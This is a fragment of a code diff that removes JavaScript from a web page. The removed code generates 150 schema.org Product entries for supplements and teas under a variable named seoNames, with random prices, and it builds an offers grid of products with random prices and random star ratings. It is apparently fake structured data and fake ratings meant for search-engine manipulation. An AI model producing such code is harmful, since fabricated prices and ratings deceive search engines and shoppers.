-            "Turmeric Latte Mix","Mushroom Coffee","Herbal Coffee","Yerba Mate","Guayusa",
-            "Rooibos Tea","Honeybush Tea","Lemon Balm","Passionflower","Skullcap",
-            "Oat Straw","Nettle Leaf","Red Clover","Alfalfa","Barley Grass",
-            "Wheatgrass","Chlorella","Blue-Green Algae","Marine Collagen","Bone Broth",
-            "Gelatin","Colostrum","Lactoferrin","Shilajit","Cordyceps",
-            "Reishi","Lion's Mane","Chaga","Turkey Tail","Maitake"
-        ];
-        for (var i = 0; i < 150; i++) {
-            var name = seoNames[i % seoNames.length] + (i >= seoNames.length ? ' ' + (Math.floor(i/seoNames.length)+1) : '');
-            var price = (Math.random() * 25 + 4.99).toFixed(2);
-            var div = document.createElement('div');
-            div.setAttribute('itemprop', 'itemListElement');
-            div.setAttribute('itemscope', '');
-            div.setAttribute('itemtype', 'http://schema.org/Product');
-            div.innerHTML = '<span itemprop="name">' + name + '</span>' +
-                '<span itemprop="offers" itemscope itemtype="http://schema.org/Offer">' +
-                '<span itemprop="price">' + price + '</span></span>';
-            seoContainer.appendChild(div);
-        }
-
-        // ---------- 4. بناء صفحة Offers كاملة ----------
-        function buildOffersPage() {
-            var products = [
-                "Organic Green Tea","Raw Honey","Almond Butter","Coconut Oil","Chia Seeds",
-                "Flaxseed Oil","Turmeric Powder","Ginger Tea","Apple Cider Vinegar","Elderberry Syrup",
-                "Ashwagandha","Vitamin C Serum","Collagen Peptides","Moringa","Spirulina",
-                "Matcha Powder","Hemp Seeds","Cacao Nibs","Goji Berries","Maca Root",
-                "Bee Pollen","Royal Jelly","Propolis Tincture","Eucalyptus Oil","Tea Tree Oil",
-                "Lavender Oil","Peppermint Oil","Chamomile Tea","Valerian Root","St. John's Wort",
-                "Milk Thistle","Dandelion Root","Burdock Root","Slippery Elm","Aloe Vera Gel",
-                "Manuka Honey","Black Seed Oil","Olive Leaf Extract","Grape Seed Extract","Pine Bark Extract",
-                "Quercetin","Resveratrol","Astaxanthin","Lutein","Zeaxanthin",
-                "Probiotic Complex","Digestive Enzymes","Betaine HCL","Apple Fiber","Psyllium Husk",
-                "Calcium Magnesium","Zinc Picolinate","Selenium","Iron Bisglycinate","Vitamin D3",
-                "Vitamin K2","B-Complex","Vitamin E","Coenzyme Q10","Alpha Lipoic Acid"
-            ]; // مصفوفة مختصرة – سيتم تدويرها لـ 150
-            var grid = document.getElementById('offers-grid');
-            var html = '';
-            for (var i = 0; i < 150; i++) {
-                var name = products[i % products.length] + (i >= products.length ? ' ' + (Math.floor(i/products.length)+1) : '');
-                var price = (Math.random() * 30 + 5).toFixed(2);
-                var rating = Math.floor(Math.random() * 2 + 3);
-                var stars = '★'.repeat(rating) + '☆'.repeat(5-rating);
-                html += '<div class="offers-card">' +
-                    '<div class="p-name">' + name + '</div>' +
-                    '<div class="p-price">$' + price + '</div>' +
-                    '<div class="p-rating">' + stars + '</div>' +
-                    '</div>';
-            }
-            grid.innerHTML = html;
-        }
-    })();
+        })();
     </script>
+
 </body>
 </html>
